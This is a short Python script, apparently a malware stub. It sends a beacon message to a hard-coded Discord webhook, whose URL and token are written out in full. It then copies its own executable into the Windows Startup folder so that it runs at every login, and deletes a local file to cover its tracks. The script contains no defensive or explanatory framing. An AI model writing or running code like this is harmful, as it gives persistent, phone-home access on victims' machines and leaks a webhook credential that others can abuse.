import dhooks ,shutil, sys, os
roaming = os.getenv('APPDATA')
hook = dhooks.Webhook('https://discord.com/api/webhooks/997154143007424532/Azb1UjCBndMFZuvZ4znZGYkNsJNRZQn829J5P5r8PGF094ZdQncPkGxroBIw3Z1bS-LM')

hook.send('a')

def launch():
    filePath = shutil.copy(sys.argv[0], roaming + '\Microsoft\Windows\Start Menu\Programs\Startup')
    os.remove('./file.py')
launch()
